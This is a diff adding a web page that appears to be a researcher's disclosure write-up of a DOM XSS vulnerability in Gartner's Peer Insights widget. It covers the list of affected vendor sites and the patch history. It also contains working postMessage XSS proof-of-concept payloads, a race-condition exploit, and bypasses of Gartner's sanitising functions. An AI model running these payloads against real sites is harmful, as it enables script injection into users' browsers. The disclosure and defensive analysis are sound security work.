+                "wid": "N2IyY2RjYzAtMDhiNy00MjQ3LWIwODktMTE3N2Y0MTQ3OGFl",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Tata Communications": {
+                "url": "https://www.tatacommunications.com/gartner-peer-insights/",
+                "wid": "YTk3OTdkYTUtNDdjMy00OWMxLTlmOWUtYWJjN2NlMmUwMTVh",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Trinamix": {
+                "url": "https://www.trinamix.com/gartner-peer-reviews/",
+                "wid": "M2YwMmMzZDAtMGVhNy00OWFmLWFhMjctOGE1MzZhMGJiMDdj",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Veeam": {
+                "url": "https://www.veeam.com/2022-gartner-magic-quadrant.html",
+                "wid": "ZDczYjMwYmMtMGFjZi00NTY5LWIwNmQtOTY4OGI2MGRiZGZm",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Vodafone": {
+                "url": "https://www.vodafone.com/business/solutions/mobile-communications/MDM",
+                "wid": "MzU3NTBlYzctYmQ3Yi00ODYwLThkZWQtZWEzYmVlMmM3YjM0",
+                "disabled": true,
+                "comment": "Patched"
+            },
+            "Wrike": {
+                "url": "https://www.wrike.com/tour/",
+                "wid": "NTdmNjc1OTktZDU2MS00MTQ2LTk0MjItYWJkOWY3ODQ0OTQ3",
+                "disabled": true,
+                "comment": "Patched"
+            }
+        }
+
+        // Populate options
+        for (const [name, target] of Object.entries(targets)) {
+            let opt = document.createElement("option");
+            let hostname = new URL(target["url"]).hostname
+            let label = "comment" in target ? `${name} [${hostname}] (${target["comment"]})` : `${name} [${hostname}]`;
+            opt.value = name;
+            opt.innerText = label;
+            "disabled" in target && (opt.disabled = target["disabled"]);
+            form.elements.targetSelect.add(opt);
+        }
+
+        function refreshForm() {
+            let target_name = form.elements.targetSelect.value;
+            let target = targets[target_name];
+            if (target_name === "Custom") {
+                form.elements.targetURL.removeAttribute("readonly");
+                form.elements.targetWidgetID.removeAttribute("readonly");
+            } else {
+                form.elements.targetURL.readonly = true;
+                form.elements.targetURL.value = target["url"];
+                form.elements.targetWidgetID.readonly = true;
+                form.elements.targetWidgetID.value = target["wid"];
+            }
+        }
+
+        document.getElementById("targetSelect").addEventListener("change", refreshForm);
+
+        form.addEventListener("submit", evt => {
+            evt.preventDefault();
+            refreshForm();
+            let target = window.open(form.elements.targetURL.value);
+            setTimeout(sendit, 3000, target, form.elements.targetWidgetID.value, form.elements.payload.value);
+
+        })
+    </script>
+
+    <h3>Gallery</h3>
+    <p>
+        Following are screenshots of some affected sites, taken before the issue was patched by Gartner.
+    </p>
+    <div class="photo-gallery">
+        <div class="container">
+            <div class="row photos">
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/blackkite.png" data-title="Black Kite XSS" data-lightbox="photos"><img class="img-fluid" src="images/blackkite.png" alt="XSS in blackkite.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/gradle.png" data-title="Gradle XSS" data-lightbox="photos"><img class="img-fluid" src="images/gradle.png" alt="XSS in gradle.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/logrhythm.png" data-title="LogRhythm XSS" data-lightbox="photos"><img class="img-fluid" src="images/logrhythm.png" alt="XSS in logrhythm.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/reversinglabs.png" data-title="ReversingLabs XSS" data-lightbox="photos"><img class="img-fluid" src="images/reversinglabs.png" alt="XSS in www.reversinglabs.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/sentinelone.png" data-title="SentinelOne XSS" data-lightbox="photos"><img class="img-fluid" src="images/sentinelone.png" alt="XSS in www.sentinelone.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/synopsys.png" data-title="Synopsys XSS" data-lightbox="photos"><img class="img-fluid" src="images/synopsys.png" alt="XSS in www.synopsys.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/tata.png" data-title="Tata Communications XSS" data-lightbox="photos"><img class="img-fluid" src="images/tata.png" alt="XSS in www.tatacommunications.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/veeam.png" data-title="Veeam XSS" data-lightbox="photos"><img class="img-fluid" src="images/veeam.png" alt="XSS in www.veeam.com"></a></div>
+                <div class="col-sm-6 col-md-4 col-lg-3 item"><a href="images/vodafone.png" data-title="Vodafone XSS" data-lightbox="photos"><img class="img-fluid" src="images/vodafone.png" alt="XSS in www.vodafone.com"></a></div>
+            </div>
+        </div>
+    </div>
+
+
+    <h3>Case Study - Black Kite</h3>
+    <p>
+        Black Kite is a Security Ratings Service (SRS) vendor. Customers of the Black Kite service use it to perform vulnerability scans of their current or prospective vendors/suppliers.
+    </p>
+    <p>
+        The following Proof of Concept triggered the vulnerability on Black Kite's website until 19 December 2022.
+    </p>
+
+    <pre><code class="language-js" id="blackkitepoc">(function() {
+    if (location.origin.indexOf("gartner.com") == -1) {alert("Origin does not contain gartner.com"); return}
+    let w = window.open("https://blackkite.com");
+    setTimeout(function() {
+        w.postMessage(JSON.stringify({
+            "widgetId": "YzdhOTVlZDEtZGVjZS00NDBhLTgwODUtMWJlNjM1ZGE0NzVj",
+            "reviews": [],
+            "vendor": {
+                "rating": "&lt;img src='//x' onerror='alert(document.domain)'&gt;"
+            }
+        }), '*');
+    }, 5000)
+})();</code></pre>
+    <p>
+        <button class="btn btn-primary" onclick="eval(document.getElementById('blackkitepoc').innerText)" disabled="disabled">Try me (Patched)</button>
+    </p>
+
+    <h3>Recommended Fix</h3>
+
+    <p>
+        I originally recommended that Gartner's Peer Insights Widget code should not simply check that "gartner.com" appears anywhere within the message sender's origin. It should check that the origin's hostname part ends with "gartner.com", or preferably nail it down to the exact origin that is expected to be sending messages to the Widget.
+    </p>
+    <p>
+        I also said that doing only this will leave websites vulnerable to any XSS on a *.gartner.com website. That is to say, a *.gartner.com XSS vulnerability could be used to do a cross-site postMessage to vendor websites with malicious <code>e</code> attributes that achieve DOM-based XSS. Since the postMessage in such a case would be coming from a *.gartner.com site, it might be considered trustworthy by the message handler (see above suggestion). I suggested that a more robust Widget design could be to dynamically and safely construct DOM elements and stitch them together, rather than concatenating postMessage values into a wad of HTML and slamming it into the Widget's innerHTML.
+    </p>
+
+    <h2>Chapter Four - Tactical Fix (19 December 2022)</h2>
+    <p>
+        On 19 December 2022, Gartner updated widget.js with a tactical fix for the issue (<a href="https://web.archive.org/web/20230101131629/https://www.gartner.com/reviews/public/Widget/js/widget.js">Archive.org copy from 1 January 2023</a>)
+    </p>
+    <p>
+        After <a href="http://jsbeautifier.org/">beautifying</a> the patched version and normalising its minified labels against the original code, the only difference is as follows:
+    </p>
+    <pre><code class="language-diff">diff --git a/widget1.js b/widget2.js
+index a439d3c..3eaf232 100644
+--- a/widget1.js
++++ b/widget2.js
+@@ -35,8 +35,18 @@ var GartnerPI_Widget = function(e) {
+                         e = s.scrollTop, e === n ? (clearInterval(a), t.list.appendChild(i), setTimeout(u, 1e4)) : e &gt; n ? s.scrollTop -= 20 : s.scrollTop += e + r &gt; n ? n - e : r
+                     }, 55)
+             },
++            get_hostname_suffix = function(e) {
++                try {
++                    var t = new URL(e);
++                    const i = t.origin.split("."),
++                        n = i.length - 2;
++                    return 2 === i.length ? t.hostname : i.slice(n).join(".")
++                } catch (e) {
++                    return "INVALID_URL"
++                }
++            },
+             o = function(e) {
+-                e.origin.indexOf("gartner.com") &gt; -1 && y(e.data)
++                "gartner.com" == get_hostname_suffix(e.origin) && y(e.data)
+             },
+             l = function() {
+                 window.addEventListener("message", o, !1)</code></pre>
+
+    <p>
+        This change partially implements the first of the two suggestions I made to Gartner.
+    </p>
+    <p>
+        It adds a function I have called <code>get_hostname_suffix()</code> which, roughly speaking, returns the suffix of the hostname of an origin. For example, giving it "www.gartner.com" would return "gartner.com" while "gartner.com.attacker.com" would give "attacker.com".
+    </p>
+    <p>
+        Gartner used this function to ensure that the origin of the sender of the message has a hostname within *.gartner.com.
+    </p>
+    <p>
+        As far as I can tell, this successfully prevents the widget from handling messages from any website other than *.gartner.com. However, it does not change the logic of the construction of the widget's contents, meaning an XSS on *.gartner.com could be used to send malicious data to a consuming website's widget message handler, which could once again achieve DOM XSS.
+    </p>
+    <h3>Proof of Concept</h3>
+    <p>
+        <a href="https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo2.html">https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo2.html</a> is an intentionally vulnerable webpage. It executes a vendored copy of the Gartner Peer Insights widget code which was taken between 19 December 2022 and 12 January 2023. That is to say, it's a snapshot of this tactical fix.
+    </p>
+    <p>
+        Browsing to any website under *.gartner.com (e.g. <a href="https://jobs.gartner.com/">https://jobs.gartner.com/</a>) and executing the following chunk of JavaScript in the F12 Developer Console will open the vulnerable page in an invisible iframe and will then execute a JavaSript payload in its origin.
+    </p>
+    <pre><code class="language-javascript">(function() {
+    let my_hostname = (new URL(location.origin)).hostname;
+    if (!(my_hostname === "gartner.com" || my_hostname.endsWith(".gartner.com"))) {alert("Origin is not within gartner.com"); return;}
+    let ifrm = document.createElement("iframe");
+    ifrm.setAttribute("src", "https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo2.html");
+    ifrm.style.display = "none";
+    document.body.appendChild(ifrm);
+    setTimeout(function(ifrm){
+        let payload = 'alert("XSS in " + location.origin);';
+        let badImg = `&lt;img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="eval(atob('${btoa(payload)}'))"&gt;`;
+        ifrm.contentWindow.postMessage(JSON.stringify({
+            "widgetId": "OWMzM2QzN2EtNWUwYS0iRJRJFJFIRDgtNWQ4ZjgyNDIyMmY3",
+            "reviews": [],
+            "rating": badImg,
+            "vendor": {
+                "rating": badImg
+            }
+        }), '*');
+    }, 5000, ifrm);
+})();</code></pre>
+    <p>
+        Alternatively. the following will open the vulnerable page in a popup and will execute a JavaScript payload in its origin. Note that you will probably need to click to allow popups, as the popup is being created programmatically and not in response to a user interaction.
+    </p>
+    <pre><code>(function() {
+    let my_hostname = (new URL(location.origin)).hostname;
+    if (!(my_hostname === "gartner.com" || my_hostname.endsWith(".gartner.com"))) {alert("Origin is not within gartner.com"); return;}
+    let w = window.open("https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo2.html");
+    setTimeout(function(w){
+        let payload = 'alert("XSS in " + location.origin);';
+        let badImg = `&lt;img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="eval(atob('${btoa(payload)}'))"&gt;`;
+        w.postMessage(JSON.stringify({
+            "widgetId": "OWMzM2QzN2EtNWUwYS0iRJRJFJFIRDgtNWQ4ZjgyNDIyMmY3",
+            "reviews": [],
+            "rating": badImg,
+            "vendor": {
+                "rating": badImg
+            }
+        }), '*');
+    }, 5000, w);
+})()</code></pre>
+
+
+    <h2>Chapter Five - Strategic Fix (12 January 2023)</h2>
+    <p>
+        On 12 January 2023, Gartner made an update to widget.js (<a href="https://web.archive.org/web/20230114015911/https://www.gartner.com/reviews/public/Widget/js/widget.js">Archive.org copy as of 14 January 2023</a>). On 14 January they said "This should count as a complete repair, provided there is no outstanding vulnerability that can still be demonstrated."
+    </p>
+    <p>
+        Roughly speaking, this change introduced three separate security controls:
+    </p>
+    <ol>
+        <li>
+            The postMessage event handler was registered with the <code>once</code> <a href="https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#parameters">option</a> being true. This caused the event handler to be automatically deregistered after it is triggered, making it a one-shot handler.
+        </li>
+        <li>
+            The allowlist of origin hostnames that can trigger the event handler was further restricted to just four names under gartner.com
+        </li>
+        <li>
+            Sanitisation was applied to message values before they were used in the construction of innerHTML data
+        </li>
+    </ol>
+    <p>
+        These controls could be bypassed, and given an XSS in one of the four blessed hostnames (see control #2), XSS could still be achieved in a consumer of the Gartner Peer Insights widget.
+    </p>
+    <h3>Analysis - One Shot Handler</h3>
+    <p>
+        The first of the three changes was as follows:
+    </p>
+    <pre><code class="language-diff">% git diff --no-index hunk1b.js hunk1a.js
+diff --git a/hunk1b.js b/hunk1a.js
+index f65cd39..784be04 100644
+--- a/hunk1b.js
++++ b/hunk1a.js
+@@ -1,3 +1,3 @@
+ l = function() {
+-    window.addEventListener("message", o, !1)
++    window.addEventListener("message", o, {once: !0})
+ },</code></pre>
+    <p>
+        This change had the effect of registering the postMessage event handler as a one-shot handler. Once the window received a message, the handler would be deregistered, and future messages would not be handled.
+    </p>
+    <p>
+        If the first postMessage message received by the window was a genuine message from Gartner, then the widget would be populated with genuine data, and future (potentially malicious) messages would not be processed.
+    </p>
+    <p>
+        However, if a malicious message arrived before the genuine message from Gartner, then the malicious message would be handled and the message from Gartner would hit the floor.
+    </p>
+    <p>
+        A small tweak to our POC code allowed us to open the victim website in a popup window and race the delivery of a postMessage message. In my testing, the approach below was 100% reliable in Firefox, and with a more aggressive <code>setTimeout</code> delay it was about 50/50 on Chrome. A better race strategy might be more reliable on Chrome.
+    </p>
+    <pre><code class="language-javascript" id="race-poc">function ding(w, m, ttl) {
+    w.postMessage(m, "*");
+    // Try again in 100 milliseconds if ttl > 0
+    // setTimeout means we don't block the JS engine
+    ttl > 0 && setTimeout(ding, 100, w, m, ttl - 1);
+}
+(function(){
+    let u = "https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo3.html";
+    let w = window.open(u);
+    let m = "evil message"
+    ding(w, m, 1000);})()</code></pre>
+    <p>
+        <button class="btn btn-primary" onclick="eval(document.getElementById('race-poc').innerText)">Try me</button>
+    </p>
+    <p>
+        <a href="https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo3.html">https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo3.html</a> is an intentionally vulnerable webpage. It executes a vendored copy of the Gartner Peer Insights widget code which was taken after 12 January 2023. That is to say, it's a snapshot of the attempted strategic fix.
+    </p>
+    <p>
+        By opening the intentionally vulnerable page, setting a breakpoint within the postMessage handler function <code>l()</code>, and then running the above in Firefox, the breakpoint will be hit. It will show the received message as being "evil message", demonstrating a successful race.
+    </p>
+    <p>
+        Setting <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1569859">devtools.popups.debug to True</a> may help with getting the breakpoint to hit.
+    </p>
+    <p>
+        <img src="images/race_breakpoint.png" class="img-fluid mx-auto d-block" alt="Breakpoint being hit within the handler function">
+    </p>
+    <h3>Analysis - postMessage Origin Restriction</h3>
+    <p>
+        The second of the three changes was as follows:
+    </p>
+    <pre><code class="language-diff">diff --git a/hunk2b.js b/hunk2a.js
+index e2c8128..a63f951 100644
+--- a/hunk2b.js
++++ b/hunk2a.js
+@@ -1,13 +1,12 @@
+-get_hostname_suffix = function(e) {
+-    try {
+-        var t = new URL(e);
+-        const i = t.origin.split("."),
+-            n = i.length - 2;
+-        return 2 === i.length ? t.hostname : i.slice(n).join(".")
+-    } catch (e) {
+-        return "INVALID_URL"
+-    }
+-},
++check_hostname = function(e) {
++    var t = new Set(["gcom.pdodev.aws.gartner.com", "gcom.pdoqa.aws.gartner.com", "gartner.com", "www.gartner.com"]);
++    try {
++        var i = new URL(e).hostname;
++        return t.has(i) ? "APPROVED_URL" : "INVALID_URL"
++    } catch (e) {
++        return "INVALID_URL"
++    }
++},
+     o = function(e) {
+-        "gartner.com" == get_hostname_suffix(e.origin) && y(e.data)
++        "APPROVED_URL" == check_hostname(e.origin) && y(e.data)
+ },</code></pre>
+    <p>
+        This change further restricted the origin hostnames that could send messages. The December 2022 patch changed it from *gartner.com* to *.gartner.com, and this change cranked it down to four specific gartner.com hostnames.
+    </p>
+    <p>
+        Taking this change in isolation, if there was an XSS vulnerability on any of these hostnames, then the DOM XSS in the widget could still be exploited.
+    </p>
+    <h3>Analysis - Filtering of postMessage message values</h3>
+    <p>
+        The final change was as follows:
+    </p>
+    <pre class="pre-scrollable" style="max-height: 75vh"><code class="language-diff">diff --git a/hunk3b.js b/hunk3a.js
+index fe0ecee..2044e32 100644
+--- a/hunk3b.js
++++ b/hunk3a.js
+@@ -1,30 +1,46 @@
++_validateString = function(e) {
++    if (!("string" == typeof e || e instanceof String)) return "";
++    var t = (new DOMParser).parseFromString(e, "text/html");
++    return Array.from(t.body.childNodes).some(function(e) {
++        return 1 === e.nodeType
++    }) ? "" : e
++},
++_validateNumber = function(e) {
++    return Number.isNaN(e) ? 0 : e
++},
+ _ = function(e) {
+     var i = C(e);
+-    t.dataContainer.innerHTML = i.join(""), v(e.url, e.seoName)
++    t.dataContainer.innerHTML = i.join("");
++    var n = _validateString(e.url),
++        r = _validateString(e.seoName);
++    v(n, r)
+ },
+ A = function(e) {
+     var i = e.reviews,
+         n = e.vendor,
+         r = C(n);
+     r.push('&lt;div class="gartner-pi-reviews"&gt;'), r.push("&lt;ul&gt;");
+-    for (var s = 0; s &lt; i.length; s++) {
+-        var a = i[s];
+-        r.push("&lt;li&gt;"), r.push('&lt;div class="gartner-pi-rating-container"&gt;'), r.push(k(a.rating)), r.push('&lt;span class="gartner-pi-datestamp"&gt;'), r.push("Reviewed " + m(a.date)), r.push("&lt;/span&gt;"), r.push("&lt;/div&gt;"), r.push('&lt;p class="gartner-pi-quote"&gt;"' + a.headline + '..." '), r.push("&lt;span&gt;(read more)&lt;/span&gt;&lt;/p&gt;"), r.push("&lt;/li&gt;")
++    for (var a = 0; a &lt; i.length; a++) {
++        var s = i[a],
++            d = _validateString(s.headline);
++        r.push("&lt;li&gt;"), r.push('&lt;div class="gartner-pi-rating-container"&gt;'), r.push(k(_validateNumber(s.rating))), r.push('&lt;span class="gartner-pi-datestamp"&gt;'), r.push("Reviewed " + m(s.date)), r.push("&lt;/span&gt;"), r.push("&lt;/div&gt;"), r.push('&lt;p class="gartner-pi-quote"&gt;"' + d + '..." '), r.push("&lt;span&gt;(read more)&lt;/span&gt;&lt;/p&gt;"), r.push("&lt;/li&gt;")
+     }
+     r.push("&lt;/ul&gt;"), r.push("&lt;/div&gt;"), t.dataContainer.innerHTML = r.join("")
+ },
+ C = function(e) {
+     var i = [],
+-        n = e.rating,
+-        r = e.score,
+-        s = e.reviewCount,
+-        a = e.name,
+-        d = e.market;
+-    return i.push('&lt;div class="gartner-pi-gradient"&gt;&lt;/div&gt;'), i.push('&lt;div class="gartner-pi-card"&gt;'), i.push('&lt;div class="gartner-pi-logo"&gt;&lt;/div&gt;'), i.push('&lt;div class="gartner-pi-header"&gt;'), i.push('&lt;h1 class="gartner-pi-h1"&gt;' + a + "&lt;/h1&gt;"), i.push('&lt;h2 class="gartner-pi-h2"&gt;' + d + "&lt;/h2&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-stats"&gt;'), i.push('&lt;div class="gartner-pi-alignLeft"&gt;'), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + n + "&lt;/span&gt;"), i.push(k(n)), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;" + s + " Rating" + (s &gt; 1 ? "s" : "") + " "), i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'), i.push("&lt;/span&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-alignRight"&gt;'), t.sourcingLink ? (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;Submit a review&lt;/a&gt;'), i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'), i.push("&lt;/div&gt;")) : (i.push("&lt;div&gt;"), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + r + "%&lt;/span&gt;"), i.push('&lt;span class="gartner-pi-thumbs-up"&gt;&lt;/span&gt;'), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;Recommend&lt;/span&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;")), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + "&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i
++        n = _validateNumber(e.rating),
++        r = _validateNumber(e.score),
++        a = _validateNumber(e.reviewCount),
++        s = _validateString(e.name),
++        d = _validateString(e.market);
++    return i.push('&lt;div class="gartner-pi-gradient"&gt;&lt;/div&gt;'), i.push('&lt;div class="gartner-pi-card"&gt;'), i.push('&lt;div class="gartner-pi-logo"&gt;&lt;/div&gt;'), i.push('&lt;div class="gartner-pi-header"&gt;'), i.push('&lt;h1 class="gartner-pi-h1"&gt;' + s + "&lt;/h1&gt;"), i.push('&lt;h2 class="gartner-pi-h2"&gt;' + d + "&lt;/h2&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-stats"&gt;'), i.push('&lt;div class="gartner-pi-alignLeft"&gt;'), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + n + "&lt;/span&gt;"), i.push(k(n)), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;" + a + " Rating" + (a &gt; 1 ? "s" : "") + " "), i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'), i.push("&lt;/span&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-alignRight"&gt;'), t.sourcingLink ? (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;Submit a review&lt;/a&gt;'), i.push('&lt;span class="gartner-pi-chevron"&gt;&lt;/span&gt;'), i.push("&lt;/div&gt;")) : (i.push("&lt;div&gt;"), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + r + "%&lt;/span&gt;"), i.push('&lt;span class="gartner-pi-thumbs-up"&gt;&lt;/span&gt;'), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;Recommend&lt;/span&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;")), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + "&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i
+ },
+ L = function(e) {
+     var i = [],
+-        n = e.rating,
+-        r = e.reviewCount;
+-    i.push('&lt;div class="gartner-pi-card"&gt;'), i.push('&lt;div class="gartner-pi-stats"&gt;'), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + n + "&lt;/span&gt;"), i.push('&lt;div class="gartner-pi-translate"&gt;'), i.push(k(n)), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;" + r + " Rating" + (r &gt; 1 ? "s" : "") + "&lt;/span&gt;"), i.push(" on Gartner Peer Insights&lt;/div&gt;"), t.sourcingLink && (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;(Submit a review)&lt;/a&gt;'), i.push("&lt;/div&gt;")), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + "&lt;/div&gt;"), i.push("&lt;/div&gt;"), t.dataContainer.innerHTML = i.join(""), v(e.url, e.seoName)
++        n = _validateNumber(e.rating),
++        r = _validateNumber(e.reviewCount),
++        a = _validateString(e.url),
++        s = _validateString(e.seoName);
++    i.push('&lt;div class="gartner-pi-card"&gt;'), i.push('&lt;div class="gartner-pi-stats"&gt;'), i.push('&lt;div class="gartner-pi-overall-rating"&gt;'), i.push('&lt;span class="gartner-pi-score"&gt;' + n + "&lt;/span&gt;"), i.push('&lt;div class="gartner-pi-translate"&gt;'), i.push(k(n)), i.push('&lt;div class="gartner-pi-reviews-link"&gt;'), i.push("&lt;span&gt;" + r + " Rating" + (r &gt; 1 ? "s" : "") + "&lt;/span&gt;"), i.push(" on Gartner Peer Insights&lt;/div&gt;"), t.sourcingLink && (i.push('&lt;div class="gartner-pi-sourcing-link"&gt;'), i.push('&lt;a id="' + t.sourcingLink + '" href="' + t.sourcingLink + '" target="_blank"&gt;(Submit a review)&lt;/a&gt;'), i.push("&lt;/div&gt;")), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push("&lt;/div&gt;"), i.push('&lt;div class="gartner-pi-as-of-date" title="As of ' + w() + '"&gt;As of ' + w() + "&lt;/div&gt;"), i.push("&lt;/div&gt;"), t.dataContainer.innerHTML = i.join(""), v(a, s)
+ },</code></pre>
+    <p>
+        To recap, the original logic of the widget's postMessage event handler was to:
+    </p>
+
+    <ol>
+        <li>Accept a string message</li>
+        <li>JSON-decode the message</li>
+        <li>Use values from the decoded message to construct wads of HTML and inject that HTML into the widget div's <code>innerHTML</code></li>
+    </ol>
+
+    <p>
+        I had suggested that Gartner consider a different approach - creating DOM elements using JavaScript and placing them within the widget's div, avoiding the use of <code>innerHTML</code>.
+    </p>
+    <p>
+        Instead, Gartner chose to add filtering logic via two new functions they named <code>_validateNumber()</code> and <code>_validateString()</code>, and to use them to sanitize the values from incoming message before constructing the wads of HTML which end up in the div's <code>innerHTML</code>.
+    </p>
+    <p>
+        Both of the sanitizing functions could be bypassed.
+    </p>
+    <h4>Bypassing <code>_validateNumber()</code></h4>
+    <p>
+        <code>_validateNumber()</code> was implemented as follows:
+    </p>
+    <pre><code class="language-js">_validateNumber = function(e) {
+    return Number.isNaN(e) ? 0 : e
+};</code></pre>
+    <p>
+        This function returned 0 if the argument given to it was NaN, else it returned the argument given to it.
+    </p>
+    <p>
+        <code>Number.isNan()</code> is <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/isNaN">documented</a> as "[determining] whether the passed value is the number value NaN, and <strong>returns false if the input is not of the Number type</strong>" (emphasis mine). In the case that the call to <code>Number.isNaN()</code> returns false, <code>_validateNumber()</code> simply returned the value given to it. Meaning that <code>_validateNumber()</code> would return a string value as-is, performing no sanitisation on it.
+    </p>
+    <pre><code class="language-plaintext">&gt;&gt; _validateNumber(1337)
+1337
+
+&gt;&gt; _validateNumber(NaN)
+0
+
+&gt;&gt; _validateNumber("Hello, world!")
+"Hello, world!"
+
+&gt;&gt; _validateNumber("&lt;img src=x onerror=alert(1)&gt;")
+"&lt;img src=x onerror=alert(1)&gt;"</code></pre>
+    <p>
+        And so by targeting a value that was sanitised using <code>_validateNumber()</code> and by giving it a string value containing active content, we could still achieve DOM XSS.
+    </p>
+    <p>
+        As it happens, our POCs thus far have been using the <code>rating</code> value, which is rendered in all widgets regardless of widget size and is sanitised using <code>_validateNumber()</code>. The following code, which implements the race technique and targets the <code>rating</code> value, will achieve DOM XSS on our demo site when executed in the F12 Developer Console of www.gartner.com
+    </p>
+    <pre><code class="language-javascript">function ding(w, m, ttl) {
+    w.postMessage(m, "*");
+    ttl > 0 && setTimeout(ding, 100, w, m, ttl - 1);
+}
+(function(){
+    if (!(new Set(["gcom.pdodev.aws.gartner.com", "gcom.pdoqa.aws.gartner.com", "gartner.com", "www.gartner.com"]).has((new URL(location.origin)).hostname))) {alert("Origin's hostname is not in the blessed set"); return;}
+    let payload = "alert(document.domain);";
+    let u = "https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo3.html";
+    let wid="OWMzM2QzN2EtNWUwYS0iRJRJFJFIRDgtNWQ4ZjgyNDIyMmY3";
+    let badImg = `&lt;img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="eval(atob('${btoa(payload)}'))"&gt;`;
+    let w = window.open(u);
+    m = JSON.stringify({"widgetId": wid, "reviews": [], "rating": badImg, "vendor": {"rating": badImg}});
+    ding(w, m, 1000);})()</code></pre>
+    <h4>Bypassing <code>_validateString()</code></h4>
+    <p>
+        <code>_validateString()</code> was implemented as follows:
+    </p>
+    <pre><code class="language-javascript">_validateString = function(e) {
+    if (!("string" == typeof e || e instanceof String)) return "";
+    var t = (new DOMParser).parseFromString(e, "text/html");
+    return Array.from(t.body.childNodes).some(function(e) {
+        return 1 === e.nodeType
+    }) ? "" : e
+}</code></pre>
+    <p>
+        This code:
+    </p>
+    <ol>
+        <li>
+            Returned empty string if the value given to it is not of type string; else
+        </li>
+        <li>
+            Used <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMParser/parseFromString">DOMParser.parseFromString()</a> to parse the string as though it was HTML, resulting in a <code>HTMLDocument</code>
+        </li>
+        <li>
+            Iterated over the <code>HTMLDocument</code>'s <code>body.childNodes</code> and if any of them were of <a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/nodeType">nodeType</a> 1 (<code>Node.ELEMENT_NODE</code>), returned empty string, else returned the value given to the function
+        </li>
+    </ol>
+    <p>
+        The function seems to return empty string if there are any complete HTML tags in the string argument given to it:
+    </p>
+    <pre><code class="language-plaintext">&gt;&gt;_validateString("abcd")
+"abcd"
+
+&gt;&gt;_validateString("abcd&lt;img src=x&gt;")
+""
+
